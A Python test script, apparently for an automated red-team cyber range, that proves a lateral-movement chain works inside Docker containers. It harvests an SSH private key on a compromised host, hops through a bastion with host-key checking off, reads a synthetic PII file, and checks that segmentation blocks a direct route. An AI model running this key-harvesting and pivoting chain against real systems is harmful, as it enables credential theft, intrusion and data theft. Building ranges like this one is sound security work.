"""FREE booted-range proof of the 3c key-based inner seam end to end — no API key, no spend.

Exercises exactly what red does once it owns dba01, on the REAL range:
  1) HARVEST (map-blind): the live_postex ssh_keys probe run FROM range-dba01 surfaces the svc_dba
     private key path — red discovers it on the host it took, not handed.
  2) hop dba01 -> db-bastion: native `ssh -i <harvested key> svc_dba@db-bastion` run FROM range-dba01.
  3) hop db-bastion -> db-core: native `ssh -i <key> svc_dba@db-core cat <crown>` FROM range-db-bastion
     -> real synthetic PII bytes (crown_data.looks_like_pii).
  4) NEGATIVE / forced >=2-hop: the SAME key from range-dba01 straight to db-core must FAIL (no route;
     dba01 is not on db-core's segment) — so one key cannot shortcut the composition.
"""
import subprocess, sys
from pathlib import Path
sys.path.insert(0, str(Path(__file__).resolve().parents[3]))
from swarm import live_red, crown_data
from swarm.topo_to_compose import _SEAM_SVC_KEY_PATH, SEAM_SVC_USER

KEY, USER, CROWN = _SEAM_SVC_KEY_PATH, SEAM_SVC_USER, "/home/svc_dba/pii.json"
OPTS = "-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o BatchMode=yes -o ConnectTimeout=6"

def ip_on(host, net24):
    for ip in sorted(live_red.own_ips(f"range-{host}")):
        if ip.startswith(net24):
            return ip
    return None

BASTION_IP = ip_on("db-bastion", "10.60.")      # mgmt seg (shared with dba01)
CORE_IP    = ip_on("db-core", "10.40.")          # database seg (shared with db-bastion, NOT dba01)
print(f"db-bastion mgmt IP={BASTION_IP}  db-core database IP={CORE_IP}")

def dexec(container, sh):
    r = subprocess.run(["docker", "exec", container, "sh", "-c", sh], capture_output=True, text=True, timeout=40)
    return r.returncode, (r.stdout or "").strip(), (r.stderr or "").strip()

# a container's own `hostname` is its docker id — resolve each target's so a successful remote
# `hostname` can be matched to the host red actually landed on.
BASTION_HOST = dexec("range-db-bastion", "hostname")[1]
CORE_HOST = dexec("range-db-core", "hostname")[1]

# 1) HARVEST on dba01 — the exact probe live_postex uses for ssh_keys.
rc, out, err = dexec("range-dba01",
    'ls -1 /root/.ssh/id_* /home/*/.ssh/id_* 2>/dev/null; find /root /home -maxdepth 3 -name id_ed25519 2>/dev/null')
assert KEY in out, f"1) HARVEST FAIL: svc_dba key not discoverable on dba01; got {out!r}"
assert live_red._user_from_key_path(KEY) == USER, "1) key path must yield owner svc_dba"
print(f"1) OK harvest: {KEY} discoverable on dba01 (owner read off path = {USER})")

# 2) hop dba01 -> db-bastion, native ssh -i FROM dba01.
rc, out, err = dexec("range-dba01", f"ssh -i {KEY} {OPTS} {USER}@{BASTION_IP} hostname")
assert rc == 0 and out == BASTION_HOST, f"2) HOP1 FAIL rc={rc} out={out!r} (want {BASTION_HOST!r}) err={err!r}"
print(f"2) OK hop1: ssh -i svc_dba@db-bastion FROM dba01 -> landed on db-bastion ({out}) (native key auth)")

# 3) hop db-bastion -> db-core, read the crown PII.
rc, out, err = dexec("range-db-bastion", f"ssh -i {KEY} {OPTS} {USER}@{CORE_IP} cat {CROWN}")
assert rc == 0 and out, f"3) HOP2 FAIL rc={rc} err={err!r}"
assert crown_data.looks_like_pii(out), "3) crown read did not ground as PII"
print(f"3) OK hop2+exfil: ssh -i svc_dba@db-core cat crown FROM db-bastion -> {len(out)}B, looks_like_pii=True")

# 4) NEGATIVE: the same key from dba01 straight to db-core must have NO route (forced >=2-hop).
rc, out, err = dexec("range-dba01", f"ssh -i {KEY} {OPTS} {USER}@{CORE_IP} hostname")
assert rc != 0 and out != CORE_HOST, f"4) SHORTCUT LEAK: dba01 reached db-core directly! rc={rc} out={out!r}"
print(f"4) OK forced-2hop: dba01 -> db-core DIRECT fails (no route): rc={rc} ({(err or out)[:50]!r})")

print("\nKEY-SEAM CHAIN PROOF PASS: red harvests the svc_dba key on the host it took, native ssh -i "
      "lands dba01->db-bastion->db-core, the crown reads as real PII, and the one key CANNOT shortcut "
      "the crown from dba01 — segmentation forces the >=2-hop composition.")
